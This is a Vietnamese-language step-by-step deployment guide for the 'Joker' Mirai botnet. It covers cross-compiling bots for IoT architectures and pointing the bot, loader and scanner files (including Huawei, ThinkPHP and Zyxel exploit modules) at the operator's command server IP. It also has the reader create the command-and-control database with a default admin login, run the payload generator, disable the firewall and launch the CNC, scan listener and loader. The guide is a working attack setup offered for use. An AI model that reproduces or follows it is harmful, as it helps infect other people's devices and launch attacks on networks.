- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Cài đặt mọi thứ trên centos
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sao chép & Dán này: 
```
yum update -y
```
```
yum install epel-release -y
```
```
yum groupinstall "Development Tools" -y
```
```
yum install gmp-devel -y
```
```
ln -s /usr/lib64/libgmp.so.3  /usr/lib64/libgmp.so.10
```
```
yum install screen wget bzip2 gcc nano gcc-c++ electric-fence sudo git libc6-dev httpd xinetd tftpd tftp-server mysql mysql-server gcc glibc-static -y
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Cài đặt Golang:

```
rm -rf /usr/local/go
```
```
wget https://dl.google.com/go/go1.10.3.linux-amd64.tar.gz
```
nếu lỗi không tải xuống thì cài đặt wget
```
sha256sum go1.10.3.linux-amd64.tar.gz
```
```
sudo tar -C /usr/local -xzf go1.10.3.linux-amd64.tar.gz
```
```
export PATH=$PATH:/usr/local/go/bin
```
```
source ~/.bash_profile
```
```
rm -rf go1.10.3.linux-amd64.tar.gz
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sao chép & Dán này: 
```
mkdir /etc/xcompile
cd /etc/xcompile
```
```
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-i586.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-m68k.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mips.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-mipsel.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-powerpc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sh4.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-sparc.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv4l.tar.bz2
wget https://www.uclibc.org/downloads/binaries/0.9.30.1/cross-compiler-armv5l.tar.bz2
wget http://distro.ibiblio.org/slitaz/sources/packages/c/cross-compiler-armv6l.tar.bz2
wget https://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
```
```
tar -jxf cross-compiler-i586.tar.bz2; 
tar -jxf cross-compiler-m68k.tar.bz2
tar -jxf cross-compiler-mips.tar.bz2
tar -jxf cross-compiler-mipsel.tar.bz2
tar -jxf cross-compiler-powerpc.tar.bz2
tar -jxf cross-compiler-sh4.tar.bz2
tar -jxf cross-compiler-sparc.tar.bz2
tar -jxf cross-compiler-armv4l.tar.bz2
tar -jxf cross-compiler-armv5l.tar.bz2
tar -jxf cross-compiler-armv6l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2
```
```
rm -rf *.tar.bz2
mv cross-compiler-i586 i586
mv cross-compiler-m68k m68k
mv cross-compiler-mips mips
mv cross-compiler-mipsel mipsel
mv cross-compiler-powerpc powerpc
mv cross-compiler-sh4 sh4
mv cross-compiler-sparc sparc
mv cross-compiler-armv4l armv4l
mv cross-compiler-armv5l armv5l
mv cross-compiler-armv6l armv6l
mv cross-compiler-armv7l armv7l
```
```
cd /tmp
wget https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz -q
tar -xzf go1.8.3.linux-amd64.tar.gz
mv go /usr/local/go
cd ~/
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Thay đổi IP ```173.232.146.173``` thành IP của VPS

```/bot/huawei.c``` (dòng 271)

```/bot/thinkphp.c``` (dòng 277)

```/bot/zyxel_scanner.c``` (dòng 278)

```/bot/includes.h```  (4 địa điểm)

```/cnc/main.go``` 

```/dlr/main.c```  (để dấu , trong IP)

```/loader/src/main.c``` (Dòng 30, 31, Hai lần trên 42)

```/scanListen.go```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Cài đặt mysql tạo mật khẩu root

```
yum install mariadb-server -y
```
```
systemctl start mariadb.service
```
```
mysql_secure_installation
```
VÀ THAY ĐỔI MẬT KHẨU MYSQL CỦA BẠN TRONG ```cnc/main.go```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Đăng nhập vào mysql:

```
mysql -pMẬT KHẨU CỦA BẠN
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Tạo cơ sở dữ liệu:
```
CREATE DATABASE Joker;
use Joker;
CREATE TABLE `history` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` int(10) unsigned NOT NULL,
  `time_sent` int(10) unsigned NOT NULL,
  `duration` int(10) unsigned NOT NULL,
  `command` text NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`)
);
 
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `username` varchar(32) NOT NULL,
  `password` varchar(32) NOT NULL,
  `duration_limit` int(10) unsigned DEFAULT NULL,
  `cooldown` int(10) unsigned NOT NULL,
  `wrc` int(10) unsigned DEFAULT NULL,
  `last_paid` int(10) unsigned NOT NULL,
  `max_bots` int(11) DEFAULT '-1',
  `admin` int(10) unsigned DEFAULT '0',
  `intvl` int(10) unsigned DEFAULT '30',
  `api_key` text,
  PRIMARY KEY (`id`),
  KEY `username` (`username`)
);
 
CREATE TABLE `whitelist` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `prefix` varchar(16) DEFAULT NULL,
  `netmask` tinyint(3) unsigned DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `prefix` (`prefix`)
);
INSERT INTO users VALUES (NULL, 'clown', 'clown1337', 0, 0, 0, 0, -1, 1, 30, '');

CREATE TABLE `logins` (
  `id` int(11) NOT NULL,
  `username` varchar(32) NOT NULL,
  `action` varchar(32) NOT NULL,
  `ip` varchar(15) NOT NULL,
  `timestamp` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=latin1;
exit;
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sao chép & Dán này: 
```
cd ~/; chmod 0777 * -R; sh build.sh
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sao chép & Dán này: 
```
python payload.py; service httpd restart 
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```
yum install firewalld;service firewalld stop
```
```
yum install iptables;iptables -F;service iptables stop 
```
```
yum install httpd;service httpd restart  
```
```
service mysqld restart
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
```
nano /usr/include/bits/typesizes.h
```
cuộn xuống và chỉnh sửa 1024 thành 999999
SAU ĐÓ LƯU BẰNG: ctrl X rồi Y
Sao chép & Dán 
```
ulimit -n999999; ulimit -u999999; ulimit -e999999
```
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```
cd ~/
screen -S cnc ./cnc
```
CTRL A D
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```
cd loader/
screen -S rep ./scanListen 
```
CTRL A D
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
```
screen -S loader
./run.sh
```
CTRL A D
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
[Nguồn](https://github.com/USBBios/Joker-Mirai-Botnet-Source-V1)
